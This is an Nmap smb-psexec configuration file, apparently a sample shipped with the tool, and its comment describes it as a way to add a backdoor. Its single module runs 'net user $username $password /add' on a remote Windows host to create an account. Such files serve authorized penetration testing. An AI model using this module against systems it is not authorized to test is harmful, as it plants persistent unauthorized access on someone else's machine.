---This config file is designed for adding a backdoor to the system. It has a few
-- options by default, only one enabled by default. I suggest
--
-- Note that none of these modules are included with Nmap by default.

-- Any variable in the 'config' table in smb-psexec.nse can be overriden in the
-- 'overrides' table. Most of them are not really recommended, such as the host,
-- key, etc.
overrides = {}
--overrides.timeout = 40

modules = {
  {
    -- TODO: allow the user to specify parameters
    --Note: password can't be longer than 14-characters, otherwise the program pauses for
    -- a response
    upload           = false,
    name             = "Adding a user account: $username/$password",
    program          = "net",
    args             = "user $username $password /add",
    maxtime          = 2,
    noblank          = true,
    req_args         = {'username','password'},
  },
}
